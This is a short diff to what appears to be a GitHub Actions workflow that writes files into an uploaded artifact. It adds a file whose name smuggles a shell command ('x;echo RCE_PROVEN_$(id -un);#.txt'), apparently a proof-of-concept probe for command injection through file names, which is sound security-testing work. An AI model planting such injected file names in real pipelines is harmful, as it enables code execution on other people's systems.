@@ -15,7 +15,8 @@ jobs:
           set -e
           mkdir -p content
           printf 'hello\n' > content/report.txt
-          printf 'x\n' > 'content/$(id -un >&2).txt'
+          printf 'x\n' > content/x
+          printf 'y\n' > 'content/x;echo RCE_PROVEN_$(id -un);#.txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content
